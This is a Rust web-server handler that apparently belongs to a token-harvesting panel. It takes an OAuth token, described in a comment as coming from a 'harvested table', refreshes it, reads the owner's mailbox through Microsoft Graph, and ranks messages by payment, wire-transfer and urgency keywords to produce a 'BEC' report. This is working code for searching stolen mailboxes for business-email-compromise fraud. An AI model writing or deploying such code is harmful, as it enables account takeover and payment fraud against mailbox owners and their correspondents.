use actix_web::{web, HttpResponse, Responder};
use serde::{Deserialize, Serialize};
use chrono::Utc;

use crate::graph_client::GraphClient;

// === BEC Keywords ===

const BEC_KEYWORDS: &[&str] = &[
    "invoice", "payment", "wire transfer", "bank transfer", "transaction",
    "money", "pay", "purchase", "order", "receipt", "billing", "ACH",
    "SWIFT", "escrow", "refund", "deposit", "withdrawal", "fee",
    "commission", "budget", "expense", "reimbursement", "quote",
    "proposal", "contract", "agreement", "remittance", "overdue",
    "outstanding", "balance", "credit", "debit", "loan", "mortgage",
    "investment", "dividend", "profit", "revenue", "cost", "price",
    "amount", "sum", "total", "due", "paid", "unpaid", "pending",
    "settlement", "compensation", "salary", "wage", "bonus", "stipend",
    "grant", "funding", "sponsor", "donation", "charity", "fund",
    "account", "routing", "IBAN", "BIC", "sort code", "account number",
    "confirm", "verify", "update", "change", "new", "urgent", "immediate",
    "asap", "today", "deadline", "critical", "confidential", "private",
    "secure", "authorization", "approval", "sign", "signature", "endorse",
    "authorize", "release", "transfer", "send", "forward", "attach",
    "document", "file", "pdf", "spreadsheet", "excel", "attachment",
];

#[derive(Debug, Serialize)]
pub struct BECFinding {
    pub message_id: String,
    pub subject: String,
    pub sender: String,
    pub received_date: String,
    pub keywords_found: Vec<String>,
    pub risk_score: i32,
    pub snippet: String,
    pub has_attachments: bool,
}

#[derive(Debug, Serialize)]
pub struct BECAnalysisReport {
    pub analyzed_at: String,
    pub total_messages: i32,
    pub flagged_messages: i32,
    pub high_risk_count: i32,
    pub medium_risk_count: i32,
    pub low_risk_count: i32,
    pub findings: Vec<BECFinding>,
}

fn analyze_message(subject: &str, body_preview: &str, keywords: &[String]) -> Vec<String> {
    let text = format!("{} {}", subject, body_preview).to_lowercase();
    BEC_KEYWORDS
        .iter()
        .filter(|&&kw| text.contains(&kw.to_lowercase()))
        .map(|&kw| kw.to_string())
        .collect()
}

fn calculate_risk_score(keywords: &[String], has_attachments: bool) -> i32 {
    let mut score = keywords.len() as i32 * 10;
    if has_attachments {
        score += 15;
    }
    // High-risk keywords give extra points
    let high_risk = ["wire transfer", "bank transfer", "urgent", "immediate", "asap", "confidential", "authorization", "approve"];
    for kw in keywords {
        if high_risk.contains(&kw.as_str()) {
            score += 20;
        }
    }
    score.min(100)
}

pub async fn bec_analyze_handler(
    query: web::Query<crate::InboxApiQuery>,
    state: web::Data<crate::AppState>,
) -> impl Responder {
    let token_id = &query.token_id;

    // Retrieve token from vault or harvested table
    let token = match crate::retrieve_any_token(&state, token_id).await {
        Ok(t) => t,
        Err(_) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found"})),
    };

    // Refresh access token
    let access_token = match crate::refresh_access_token(&state, &token.refresh_token).await {
        Some(t) => t,
        None => token.access_token,
    };

    let client = GraphClient::new();

    // Fetch messages
    let messages = match client.get_messages_for_analysis(&access_token, 50).await {
        Ok(m) => m.value,
        Err(e) => {
            eprintln!("[bec] Failed to fetch messages: {}", e);
            return HttpResponse::InternalServerError().json(serde_json::json!({"error": "graph_api_failed"}));
        }
    };

    let mut findings = Vec::new();
    let mut high_risk = 0;
    let mut medium_risk = 0;
    let mut low_risk = 0;

    for msg in &messages {
        let subject = msg.subject.as_deref().unwrap_or("");
        let body_preview = msg.bodyPreview.as_deref().unwrap_or("");
        let keywords_found = analyze_message(subject, body_preview, &[]);

        if !keywords_found.is_empty() {
            let has_attachments = msg.hasAttachments.unwrap_or(false);
            let risk_score = calculate_risk_score(&keywords_found, has_attachments);

            if risk_score >= 70 {
                high_risk += 1;
            } else if risk_score >= 40 {
                medium_risk += 1;
            } else {
                low_risk += 1;
            }

            findings.push(BECFinding {
                message_id: msg.id.clone(),
                subject: subject.to_string(),
                sender: msg.from.as_ref().and_then(|f| f.emailAddress.as_ref()).and_then(|e| e.address.clone()).unwrap_or_default(),
                received_date: msg.receivedDateTime.clone().unwrap_or_default(),
                keywords_found,
                risk_score,
                snippet: body_preview.to_string(),
                has_attachments,
            });
        }
    }

    // Sort by risk score descending
    findings.sort_by(|a, b| b.risk_score.cmp(&a.risk_score));

    let report = BECAnalysisReport {
        analyzed_at: Utc::now().to_rfc3339(),
        total_messages: messages.len() as i32,
        flagged_messages: findings.len() as i32,
        high_risk_count: high_risk,
        medium_risk_count: medium_risk,
        low_risk_count: low_risk,
        findings,
    };

    HttpResponse::Ok().json(report)
}
